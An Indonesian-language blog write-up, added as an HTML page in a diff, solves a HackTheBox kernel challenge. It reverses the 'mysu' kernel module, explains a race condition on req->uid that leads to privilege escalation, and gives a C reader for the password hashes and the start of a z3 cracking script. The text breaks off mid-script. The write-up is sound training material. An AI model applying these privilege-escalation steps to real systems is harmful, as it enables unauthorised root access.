@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel · Abdullah
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Abdullah">
+<meta name="description" content="Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge hackthebox. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.
+Spoiler alert! karena instance dari challenge ini masih aktif.
+
+  0x01 Overview
+  
+    
+    Link to heading
+  
+
+Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel">
+  <meta name="twitter:description" content="Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge hackthebox. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.
+Spoiler alert! karena instance dari challenge ini masih aktif.
+0x01 Overview Link to heading Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:">
+
+<meta property="og:url" content="http://localhost:1313/posts/kernel-adventures-part-1/">
+  <meta property="og:site_name" content="Abdullah">
+  <meta property="og:title" content="Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel">
+  <meta property="og:description" content="Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge hackthebox. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.
+Spoiler alert! karena instance dari challenge ini masih aktif.
+0x01 Overview Link to heading Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-08-26T15:57:28+07:00">
+    <meta property="article:modified_time" content="2022-08-26T15:57:28+07:00">
+    <meta property="article:tag" content="Dark">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/kernel-adventures-part-1/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Abdullah
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Posts</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/kernel-adventures-part-1/">
+              Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-08-26T15:57:28&#43;07:00">
+                August 26, 2022
+              </time>
+            </span>
+            
+          </div>
+          
+          
+          
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p>Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge <a href="www.hackthebox.com" >hackthebox</a>. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.</p>
+<p>Spoiler alert! karena instance dari challenge ini masih aktif.</p>
+<h2 id="0x01-overview">
+  0x01 Overview
+  <a class="heading-link" href="#0x01-overview">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:</p>
+<pre><code>release/
+├── bzImage
+├── notes.txt
+├── rootfs.cpio.gz
+└── run.sh
+</code></pre>
+<p>Penjelasan singkat mengenai file-file diatas:</p>
+<ul>
+<li><code>bzImage</code> image kernel yang digunakan untuk booting ke sistem operasi. Didalam file ini juga terdapat binary kernel atau biasa disebut <code>vmlinux</code>.</li>
+<li><code>rootfs.cpio.gz</code> berisi filesystem image untuk sistem operasi challenge ini.</li>
+<li><code>run.sh</code> bash script yang digunakan untuk menjalankan sistem operasi.</li>
+</ul>
+<p>Yang perlu diperhatikan pada kasus ini adalah <code>rootfs.cpio.gz</code> karena disinilah file kernel module disimpan yang nantinya akan di-insert ke linux kernel menggunakan <code>insmod</code>.</p>
+<h3 id="extracting-linux-image-filesystem">
+  Extracting Linux Image Filesystem
+  <a class="heading-link" href="#extracting-linux-image-filesystem">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Ekstraksi filesystem dari image dapat menggunakan perintah <code>cpio</code> yang ada di-bash.</p>
+<pre><code>$ gunzip rootfs.cpio.gz &amp;&amp; mkdir files
+$ cd files/
+$ cpio -idmv &lt; ../rootfs.cpio
+...
+$ ls
+bin  etc   home  lib    linuxrc  mnt      opt   root  sbin  tmp  var
+dev  flag  init  lib64  media    mysu.ko  proc  run   sys   usr
+</code></pre>
+<p><code>init</code> adalah file yang akan dieksekusi pertama kali setelah proses booting selesai. <code>mysu.ko</code> ini adalah kernel module yang ditambahkan pada kernel. Untuk membaca <code>flag</code> diperlukan akses root yang bisa didapatkan dengan meng-eksploitasi kernel module <code>mysu.ko</code>. Lainnya adalah filesystem biasa yang terdapat pada linux.</p>
+<h3 id="kernel-module-structure">
+  Kernel Module Structure
+  <a class="heading-link" href="#kernel-module-structure">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Pada kernel module terdapat 2 fungsi utama yaitu <code>&lt;mod_name&gt;_init</code> dan <code>&lt;mod_name&gt;_exit</code>.</p>
+<ul>
+<li><code>&lt;mod_name&gt;_init</code> ini akan dieksekusi ketika module di-load ke kernel.</li>
+<li><code>&lt;mod_name&gt;_exit</code> ini akan dieksekusi ketika module di-unload dari kernel.</li>
+</ul>
+<p>Fungsi lain yang digunakan untuk berinteraksi antara kernel dengan user biasanya berawalan dengan <code>dev_*</code>, sebagai contoh <code>dev_open</code>, <code>dev_read</code>, dan <code>dev_write</code>. Dan ketiganya terdapat pada kernel module <code>mysu</code>.</p>
+<h2 id="0x02-reversing-kernel-module">
+  0x02 Reversing Kernel Module
+  <a class="heading-link" href="#0x02-reversing-kernel-module">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Dilihat dari <code>mysu_init</code>, kernel module akan membuat device pada <code>/dev/mysu</code> yang nantinya bisa digunakan untuk berinteraksi dengan user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password_size</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">!=</span> <span class="n">password_size</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="mi">1025</span> <span class="o">*</span> <span class="p">(</span><span class="n">password</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">password</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">res</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Fungsi <code>hash</code> melakukan kalkulasi per-byte password dengan operasi add, mult, shift, dan xor.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">dev_read</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">user_buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">user_copy_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">user_copy_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">user_copy_size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">user_buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Fungsi <code>dev_read</code> meng-copy <code>&amp;users</code> ke <code>user_buf</code> sebanyak <code>user_copy_size</code> dan panjang request copy tidak bisa lebih dari 32. <code>&amp;users</code> ini berisi <code>uid</code> dan <code>hash</code> dari users dan admin.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">dev_write</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">req_s</span> <span class="o">*</span><span class="n">req</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">user_write_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">user_write_size</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nf">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">admin</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nl">SUCCESS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uid</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptr</span> <span class="o">=</span> <span class="nf">prepare_creds</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">20</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">commit_creds</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">user_copy_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Fungsi <code>dev_write</code> melakukan perbandingan <code>req-&gt;uid</code> dan <code>req-&gt;password</code>’s hash, apakah request user merupakan <code>users</code> (uid: 1000) atau <code>admin</code> (uid: 1001). Jika semua pengecekan dapat lolos, maka kernel akan memanggil <code>commit_creds</code> dengan <code>cred-&gt;uid = req-&gt;uid</code>.</p>
+<p>Jika dilihat pada program, kita tidak bisa mengirim request dengan uid 0. Karena pengecekan hanya mengecek apakah user merupakan <code>users</code> atau <code>admin</code>. Jika tidak keduanya maka return null.</p>
+<h3 id="bug">
+  Bug
+  <a class="heading-link" href="#bug">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Jika dilihat pada <code>dev_write</code> setelah seluruh pengecekan selesai, <code>user-&gt;uid</code> akan di-fetch ke variable lokal <code>uid</code> dan akan digunakan untuk meng-assign value uid, gid, dll. dari <code>struct cred</code> sebagai argument untuk memanggil <code>commit_creds</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nf">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">admin</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">SUCCESS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span> <span class="c1">// fetch
+</span></span></span></code></pre></div><p>Bagaimana jika setelah pengecekan user yang valid selesai, lalu kita mengubah nilai dari <code>req-&gt;uid</code> tadi pada thread lain? Ini akan menimbulkan inconsistency yang bisa kita manfaatkan untuk mendapatkan <code>root</code>.</p>
+<h2 id="0x03-exploitation">
+  0x03 Exploitation
+  <a class="heading-link" href="#0x03-exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Jika dilihat dari notes.txt,</p>
+<blockquote>
+<p>“I removed the password hashes in the file I gave you. They’re not supposed to be 0.”</p></blockquote>
+<p>Author telah menghapus password hash user valid yang terdapat pada <code>mysu.ko</code> yang diberikan tadi. Maka diperlukan read terlebih dahulu di-server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define MAX_SIZE 4
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">DEVICE_PATH</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;%s: failed open the device.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[%02x]: %08x (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Jalankan pada server akan didapatkan <code>uid</code> dan <code>hash</code> password dari <code>users</code> dan <code>admin</code> yang valid.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/ $ /tmp/hax
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00<span class="o">]</span>: 000003e8 <span class="o">(</span>1000<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>01<span class="o">]</span>: 03319f75 <span class="o">(</span>53583733<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>02<span class="o">]</span>: 000003e9 <span class="o">(</span>1001<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03<span class="o">]</span>: 2ab76467 <span class="o">(</span>716661863<span class="o">)</span>
+</span></span></code></pre></div><h3 id="cracking-hash-password">
+  Cracking Hash Password
+  <a class="heading-link" href="#cracking-hash-password">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Tidak tau kenapa, z3 tidak menyelesaikannya secara optimal, sehingga dibutuhkan double check terhadap password yang didapatkan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">max_uint</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="n">max_int</span>  <span class="o">=</span> <span class="mh">0x80000000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1025</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">res</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">max_uint</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="n">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">max_uint</span>
